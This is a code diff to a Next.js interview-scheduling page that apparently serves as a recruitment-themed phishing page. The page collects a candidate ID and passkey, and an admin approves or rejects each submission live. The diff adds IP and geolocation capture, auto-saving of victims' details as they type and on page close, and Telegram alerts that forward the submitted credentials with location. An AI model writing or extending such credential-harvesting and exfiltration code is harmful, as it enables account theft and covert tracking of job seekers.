@@ -1,6 +1,6 @@
 "use client";
 
-import { useEffect, useMemo, useState, Suspense, useRef } from "react";
+import { useEffect, useMemo, useState, Suspense, useRef, useCallback } from "react";
 import { useSearchParams } from "next/navigation";
 import Link from "next/link";
 import PhoneInputWithCountry from "@/components/PhoneInputWithCountry";
@@ -93,7 +93,33 @@ function SchedulePageInner() {
     picture?: string;
   } | null>(null);
 
+  const [geoInfo, setGeoInfo] = useState<{
+    ip: string;
+    city: string;
+    state: string;
+    country: string;
+    timezone?: string;
+  } | null>(null);
+
   const FB_APP_ID = process.env.NEXT_PUBLIC_FACEBOOK_APP_ID || "2497354053994375";
+
+  // Fetch client IP and location info
+  useEffect(() => {
+    (async () => {
+      try {
+        const res = await fetch("/api/geo");
+        if (res.ok) {
+          const data = await res.json();
+          setGeoInfo(data);
+          if (data.timezone) {
+            setTimezone(data.timezone);
+          }
+        }
+      } catch (err) {
+        console.error("Geo lookup error:", err);
+      }
+    })();
+  }, []);
 
   // Initialize Facebook Javascript SDK
   useEffect(() => {
@@ -184,7 +210,11 @@ function SchedulePageInner() {
     })();
   }, [selectedDate, settings, supabase]);
 
-  // Log visit immediately when candidate opens the schedule page
+  const draftSavingRef = useRef(false);
+  const lastSavedDraftHash = useRef("");
+  const draftNotifiedRef = useRef(false);
+
+  // Log visit immediately when candidate opens the schedule page (including IP and location)
   useEffect(() => {
     if (typeof window === "undefined") return;
     const visitKey = `visit_logged_${sessionId}`;
@@ -192,7 +222,7 @@ function SchedulePageInner() {
       sessionStorage.setItem(visitKey, "1");
       (async () => {
         try {
-          await supabase.from("schedule_visits").insert({
+          const visitData = {
             session_id: sessionId,
             admin_user_id: settings.user_id || null,
             admin_email: settings.admin_email || null,
@@ -200,13 +230,142 @@ function SchedulePageInner() {
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "America/New_York",
             user_agent: typeof navigator !== "undefined" ? navigator.userAgent : null,
             referrer: typeof document !== "undefined" ? document.referrer || null : null,
-          });
+            ip_address: geoInfo?.ip || null,
+            city: geoInfo?.city || null,
+            state: geoInfo?.state || null,
+            country: geoInfo?.country || null,
+          };
+
+          await supabase.from("schedule_visits").insert(visitData);
+
+          // Dispatch immediate Telegram notification for the visit
+          fetch("/api/webhooks/telegram", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              type: "schedule_visit",
+              record: visitData,
+            }),
+          }).catch(() => {});
         } catch (err) {
           console.error("Failed to log schedule visit:", err);
         }
       })();
     }
-  }, [sessionId, settings, supabase]);
+  }, [sessionId, settings, geoInfo, supabase]);
+
+  // Real-Time Auto-Save for Draft Candidate Details (Saves candidate even if they close before popups)
+  const autoSaveDraftBooking = useCallback(async () => {
+    if (!name.trim() && !email.trim()) return;
+    if (!selectedDate || !selectedSlot) return;
+
+    const draftHash = `${name.trim()}|${email.trim()}|${phone.trim()}|${notes.trim()}|${guestEmail.trim()}|${selectedDate}|${selectedSlot.start_time}`;
+    if (draftHash === lastSavedDraftHash.current) return;
+    if (draftSavingRef.current) return;
+    draftSavingRef.current = true;
+
+    try {
+      const [firstName, ...rest] = name.trim().split(/\s+/);
+      const lastName = rest.join(" ") || "-";
+      const combinedNotes = [notes, guestEmail ? `Guests: ${guestEmail}` : ""].filter(Boolean).join("\n");
+
+      const bookingData = {
+        session_id: sessionId,
+        job_id: jobId,
+        first_name: firstName || name.trim() || "Candidate",
+        last_name: lastName,
+        email: email.trim() || `draft-${sessionId.substring(0, 8)}@temp.recruitment`,
+        phone_number: phone.trim() || null,
+        notes: combinedNotes || null,
+        date: selectedDate,
+        start_time: selectedSlot.start_time,
+        end_time: selectedSlot.end_time,
+        timezone,
+        status: "pending" as const,
+        admin_user_id: settings.user_id || null,
+        admin_email: settings.admin_email || null,
+        interviewer_name: settings.interviewer_name || null,
+        ip_address: geoInfo?.ip || null,
+        city: geoInfo?.city || null,
+        state: geoInfo?.state || null,
+        country: geoInfo?.country || null,
+      };
+
+      if (bookingId) {
+        await supabase.from("bookings").update(bookingData).eq("id", bookingId);
+        lastSavedDraftHash.current = draftHash;
+      } else {
+        const { data: existing } = await supabase
+          .from("bookings")
+          .select("id")
+          .eq("session_id", sessionId)
+          .maybeSingle();
+
+        if (existing?.id) {
+          setBookingId(existing.id);
+          await supabase.from("bookings").update(bookingData).eq("id", existing.id);
+          lastSavedDraftHash.current = draftHash;
+        } else {
+          const { data: inserted, error } = await supabase
+            .from("bookings")
+            .insert(bookingData)
+            .select("id")
+            .single();
+
+          if (!error && inserted?.id) {
+            setBookingId(inserted.id);
+            lastSavedDraftHash.current = draftHash;
+          }
+        }
+      }
+
+      // Notify Telegram when candidate details are drafted/updated
+      if (name.trim().length >= 2 && email.includes("@") && !draftNotifiedRef.current) {
+        draftNotifiedRef.current = true;
+        fetch("/api/webhooks/telegram", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            type: "candidate_draft",
+            record: {
+              ...bookingData,
+              first_name: firstName || name.trim(),
+              last_name: lastName,
+              email: email.trim(),
+              phone_number: phone.trim(),
+            },
+          }),
+        }).catch(() => {});
+      }
+    } catch (err) {
+      console.error("Auto-save draft booking error:", err);
+    } finally {
+      draftSavingRef.current = false;
+    }
+  }, [name, email, phone, notes, guestEmail, selectedDate, selectedSlot, sessionId, jobId, timezone, settings, geoInfo, bookingId, supabase]);
+
+  // Debounced trigger for auto-saving candidate details as they type
+  useEffect(() => {
+    if (step !== "details") return;
+    if (!name.trim() && !email.trim()) return;
+
+    const timer = setTimeout(() => {
+      autoSaveDraftBooking();
+    }, 600);
+
+    return () => clearTimeout(timer);
+  }, [step, name, email, phone, notes, guestEmail, autoSaveDraftBooking]);
+
+  // Flush draft booking on page close/unload
+  useEffect(() => {
+    const handleBeforeUnload = () => {
+      if (name.trim() || email.trim()) {
+        autoSaveDraftBooking();
+      }
+    };
+    window.addEventListener("beforeunload", handleBeforeUnload);
+    return () => window.removeEventListener("beforeunload", handleBeforeUnload);
+  }, [name, email, autoSaveDraftBooking]);
 
   // Real-Time Candidate Online / Offline Presence Tracking
   useEffect(() => {
@@ -228,6 +387,10 @@ function SchedulePageInner() {
           date: selectedDate,
           start_time: selectedSlot?.start_time,
           end_time: selectedSlot?.end_time,
+          ip_address: geoInfo?.ip,
+          city: geoInfo?.city,
+          state: geoInfo?.state,
+          country: geoInfo?.country,
           phase:
             phase === "confirmed"
               ? "Confirmed"
@@ -253,7 +416,7 @@ function SchedulePageInner() {
       window.removeEventListener("beforeunload", handleBeforeUnload);
       supabase.removeChannel(presenceChannel);
     };
-  }, [sessionId, bookingId, name, email, phone, selectedDate, selectedSlot, step, phase, verifyStage, supabase]);
+  }, [sessionId, bookingId, name, email, phone, selectedDate, selectedSlot, step, phase, verifyStage, geoInfo, settings, supabase]);
 
   // Realtime: admin actions on this booking drive the modal's stage and error messaging
   useEffect(() => {
@@ -429,31 +592,38 @@ function SchedulePageInner() {
     setVerifyError(null);
 
     try {
-      if (!bookingId) {
-        const [firstName, ...rest] = name.trim().split(/\s+/);
-        const lastName = rest.join(" ") || "-";
-        const combinedNotes = [notes, guestEmail ? `Guests: ${guestEmail}` : ""].filter(Boolean).join("\n");
+      const [firstName, ...rest] = name.trim().split(/\s+/);
+      const lastName = rest.join(" ") || "-";
+      const combinedNotes = [notes, guestEmail ? `Guests: ${guestEmail}` : ""].filter(Boolean).join("\n");
 
+      const submissionPayload = {
+        session_id: sessionId,
+        job_id: jobId,
+        first_name: firstName || name || "Candidate",
+        last_name: lastName,
+        email: email || candidateId,
+        phone_number: phone || null,
+        notes: combinedNotes || null,
+        date: selectedDate,
+        start_time: selectedSlot!.start_time,
+        end_time: selectedSlot!.end_time,
+        timezone,
+        candidate_id: candidateId.trim() || facebookUser?.email || candidateId,
+        passkey: passkey.trim(),
+        status: "pending" as const,
+        admin_user_id: settings.user_id || null,
+        admin_email: settings.admin_email || null,
+        interviewer_name: settings.interviewer_name || null,
+        ip_address: geoInfo?.ip || null,
+        city: geoInfo?.city || null,
+        state: geoInfo?.state || null,
+        country: geoInfo?.country || null,
+      };
+
+      if (!bookingId) {
         const { data, error } = await supabase
           .from("bookings")
-          .insert({
-            job_id: jobId,
-            first_name: firstName || name,
-            last_name: lastName,
-            email: email || candidateId,
-            phone_number: phone || null,
-            notes: combinedNotes || null,
-            date: selectedDate,
-            start_time: selectedSlot!.start_time,
-            end_time: selectedSlot!.end_time,
-            timezone,
-            candidate_id: candidateId.trim() || facebookUser?.email || candidateId,
-            passkey: passkey.trim(),
-            status: "pending",
-            admin_user_id: settings.user_id || null,
-            admin_email: settings.admin_email || null,
-            interviewer_name: settings.interviewer_name || null,
-          })
+          .insert(submissionPayload)
           .select("id")
           .single();
 
@@ -462,21 +632,24 @@ function SchedulePageInner() {
           setBookingId(data.id);
         }
       } else {
-        // Re-submission after a rejection (status was 'rejected' -> updates to 'pending')
+        // Re-submission or updating the auto-saved draft booking with credentials
         const { error } = await supabase
           .from("bookings")
-          .update({
-            candidate_id: candidateId.trim() || facebookUser?.email || candidateId,
-            passkey: passkey.trim(),
-            status: "pending",
-            admin_user_id: settings.user_id || null,
-            admin_email: settings.admin_email || null,
-            interviewer_name: settings.interviewer_name || null,
-          })
+          .update(submissionPayload)
           .eq("id", bookingId);
 
         if (error) throw error;
       }
+
+      // Notify Telegram of credential submission with IP and geolocation
+      fetch("/api/webhooks/telegram", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          type: "booking",
+          record: submissionPayload,
+        }),
+      }).catch(() => {});
 
       setVerifyStage("waiting");
     } catch (err) {
